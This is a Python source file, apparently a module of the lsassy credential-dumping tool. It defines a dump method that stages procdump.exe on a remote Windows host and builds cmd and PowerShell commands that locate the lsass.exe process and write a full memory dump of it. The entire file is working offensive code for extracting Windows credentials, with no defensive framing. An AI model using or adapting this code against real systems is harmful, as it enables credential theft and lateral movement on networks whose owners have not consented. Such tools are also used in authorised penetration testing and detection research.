from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    custom_dump_ext_support = False
    dump_ext = "dmp"

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.procdump = Dependency("procdump", "procdump.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.procdump])

    def clean(self):
        self.clean_dependencies([self.procdump])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} -accepteula -o -ma %J {}{}""".format(
            self.procdump.get_remote_path(),
            self.dump_path, self.dump_name
        )
        pwsh_command = """{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
            self.procdump.get_remote_path(),
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
